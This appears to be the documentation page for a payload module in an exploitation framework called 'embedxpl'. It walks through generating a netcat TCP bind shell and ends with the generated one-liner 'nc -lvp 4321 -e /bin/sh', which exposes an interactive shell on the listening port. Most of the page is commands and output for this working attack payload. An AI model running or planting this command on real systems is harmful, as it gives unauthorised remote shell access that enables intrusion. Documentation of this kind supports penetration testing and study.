## Description

Module generates payload that creates interactive tcp bind shell by using netcat one-liner. 

## Verification Steps

  1. Start the framework: `embedxpl` (or `python -m embedxpl` / `./exf.py`)
  2. Do: `use payloads/cmd/netcat_bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates netcat tcp bind shell payload.

## Scenarios

```
exf > use payloads/cmd/netcat_bind_tcp
exf (Netcat Bind TCP) > set rport 4321
[+] rport => 4321
exf (Netcat Bind TCP) > run
[*] Running module...
[*] Generating payload
nc -lvp 4321 -e /bin/sh
```
